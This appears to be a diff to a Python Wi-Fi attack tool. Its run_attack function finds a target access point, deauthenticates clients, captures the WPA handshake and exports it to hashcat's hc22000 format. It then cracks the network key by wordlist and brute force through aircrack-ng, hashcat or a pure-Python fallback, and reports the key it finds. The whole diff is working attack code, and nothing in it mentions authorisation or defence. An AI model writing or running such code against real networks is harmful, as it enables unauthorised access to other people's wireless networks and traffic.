@@ -14,12 +14,16 @@ companion_proto.Companion (or any object exposing find_ap/capture_handshake)."""
 import os
 
 import wpa_crack as wc
+import crackers as ck
 
 
-def run_attack(dev, ssid="", bssid="", ch=0, wordlist="", mask="", brute_limit=0,
-               capture_secs=20.0, deauth_count=16, rounds=3, local_dir=None, log=print):
-    """Drive the full cycle. Returns a dict with the outcome. `log` is a callable
-    for human-readable progress lines."""
+def run_attack(dev, ssid="", bssid="", ch=0, wordlist="", brute=False,
+               brute_charset="0123456789", brute_length=8, tool="auto",
+               capture_secs=20.0, deauth_count=16, rounds=3, local_dir=None,
+               log=print, cancel=None):
+    """Drive the full cycle (find → deauth → capture → crack → brute) using the
+    best available cracker (aircrack-ng/hashcat, else pure-Python). `log` is a
+    callable for progress lines; `cancel` an optional threading.Event."""
     out = {"ok": False, "key": None, "ssid": ssid, "bssid": bssid, "ch": ch}
 
     # 1. resolve target
@@ -61,31 +65,44 @@ def run_attack(dev, ssid="", bssid="", ch=0, wordlist="", mask="", brute_limit=0
         out["error"] = ("no usable handshake captured (try more deauth rounds / move "
                         "closer / a client must be connected)")
         return out
+    out["bssid"] = target.ap.hex(":")
     log(f"handshake captured: {target.label()}")
+    # export hc22000 alongside (for hashcat / external GPU cracking)
+    hc = cap["local"].rsplit(".", 1)[0] + ".hc22000"
+    try:
+        wc.export_hc22000(cap["local"], hc, ssid)
+        out["hc22000"] = hc
+    except Exception:  # noqa: BLE001
+        hc = ""
 
-    # 5. dictionary attack
+    chosen = ck.available_tools()[0] if tool == "auto" else tool
+    out["tool"] = chosen
+
+    def ev(e):
+        if e.get("type") == "progress":
+            log(f"  {e.get('tested', '')} tried @ {e.get('rate', 0):.0f}/s")
+
+    # 5. dictionary attack (real cracker)
     if wordlist:
-        log(f"cracking with {os.path.basename(wordlist)} …")
-        res = wc.crack_file(cap["local"], wordlist, ssid)
-        out["tried"] = res.get("tried", 0)
+        log(f"cracking with {chosen} + {os.path.basename(wordlist)} …")
+        res = ck.crack_wordlist(cap["local"], wordlist, bssid=out["bssid"], tool=tool,
+                                hc22000=hc, on_event=ev, cancel=cancel)
         if res["ok"]:
             out.update(ok=True, key=res["key"], method="wordlist")
-            log(f"✓ KEY FOUND (wordlist): {res['key']}")
+            log(f"✓ KEY FOUND (wordlist/{res['tool']}): {res['key']}")
             return out
-        log(f"wordlist exhausted ({res.get('tried', 0)} tries)")
+        log(f"wordlist exhausted ({res.get('tested', 0)} tried via {res['tool']})")
 
-    # 6. brute-force by mask
-    if mask:
-        ks = wc.mask_keyspace(mask)
-        log(f"brute mask {mask} (keyspace {ks:,}"
-            + (f", capped {brute_limit:,}" if brute_limit else "") + ") …")
-        res = wc.brute_file(cap["local"], mask, ssid, brute_limit)
-        out["brute_tried"] = res.get("tried", 0)
+    # 6. brute-force
+    if brute:
+        log(f"brute {brute_length}×[{brute_charset}] via {chosen} …")
+        res = ck.crack_brute(cap["local"], brute_charset, brute_length, bssid=out["bssid"],
+                             tool=tool, hc22000=hc, on_event=ev, cancel=cancel)
         if res["ok"]:
             out.update(ok=True, key=res["key"], method="brute")
-            log(f"✓ KEY FOUND (brute): {res['key']}")
+            log(f"✓ KEY FOUND (brute/{res['tool']}): {res['key']}")
             return out
-        log(f"brute exhausted ({res.get('tried', 0)} tries)")
+        log(f"brute exhausted ({res.get('tested', 0)} tried via {res['tool']})")
 
     out["error"] = "key not found (wordlist/brute exhausted)"
     return out
